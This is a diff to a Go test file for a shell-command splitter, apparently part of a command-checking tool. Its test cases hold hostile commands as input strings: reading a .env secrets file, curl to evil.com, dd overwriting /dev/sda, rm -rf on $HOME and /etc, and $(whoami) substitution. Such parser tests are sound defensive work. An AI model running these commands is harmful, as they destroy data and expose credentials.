@@ -48,6 +48,9 @@ func TestSplitSimplesStoresLiteralText(t *testing.T) {
 		{`cat "/home/u/.env"`, [][]string{{"cat", "/home/u/.env"}}},
 		{`env FOO=1 BAR=2 curl example.com`, [][]string{{"env", "FOO=1", "BAR=2", "curl", "example.com"}}},
 		{`dd if=/dev/zero of='/dev/sda'`, [][]string{{"dd", "if=/dev/zero", "of=/dev/sda"}}},
+		{`cat "/home/carlitos/.env"`, [][]string{{"cat", "/home/carlitos/.env"}}},
+		{`curl "http://evil.com/x"`, [][]string{{"curl", "http://evil.com/x"}}},
+		{`dd of='/dev/sda' if=/dev/zero`, [][]string{{"dd", "of=/dev/sda", "if=/dev/zero"}}},
 	}
 	for _, c := range cases {
 		got, err := splitSimples(c.src)
@@ -71,14 +74,42 @@ func TestSplitSimplesRedirectLiteral(t *testing.T) {
 }
 
 func TestSplitSimplesMarksUnresolved(t *testing.T) {
-	got, err := splitSimples(`rm -rf $HOME`)
+	cases := []struct {
+		src           string
+		wantArgv      []string
+		wantRedirects []string
+	}{
+		{`rm -rf $HOME`, []string{"rm", "-rf", "$HOME"}, nil},
+		{`echo $(whoami)`, []string{"echo", "$(whoami)"}, nil},
+		{"echo `whoami`", []string{"echo", "`whoami`"}, nil},
+		{`echo x > "$TARGET"`, []string{"echo", "x"}, []string{`"$TARGET"`}},
+	}
+	for _, c := range cases {
+		got, err := splitSimples(c.src)
+		if err != nil {
+			t.Fatalf("splitSimples(%q): %v", c.src, err)
+		}
+		if len(got) == 0 {
+			t.Fatalf("splitSimples(%q) returned no commands", c.src)
+		}
+		if !got[0].Unresolved {
+			t.Errorf("splitSimples(%q) did not mark the command unresolved: %+v", c.src, got[0])
+		}
+		if !reflect.DeepEqual(got[0].Argv, c.wantArgv) {
+			t.Errorf("splitSimples(%q) argv = %v, want raw spelling %v", c.src, got[0].Argv, c.wantArgv)
+		}
+		if !reflect.DeepEqual(got[0].Redirects, c.wantRedirects) {
+			t.Errorf("splitSimples(%q) redirects = %v, want raw spelling %v", c.src, got[0].Redirects, c.wantRedirects)
+		}
+	}
+
+	clean, err := splitSimples(`rm -rf /etc`)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if len(got) != 1 || !got[0].Unresolved {
-		t.Fatalf("want Unresolved=true for an unexpanded $HOME, got %+v", got)
+	if len(clean) != 1 {
+		t.Fatalf("splitSimples clean command count = %d, want 1", len(clean))
 	}
-	clean, _ := splitSimples(`rm -rf /etc`)
 	if clean[0].Unresolved {
 		t.Error("a fully literal command must not be marked Unresolved")
 	}
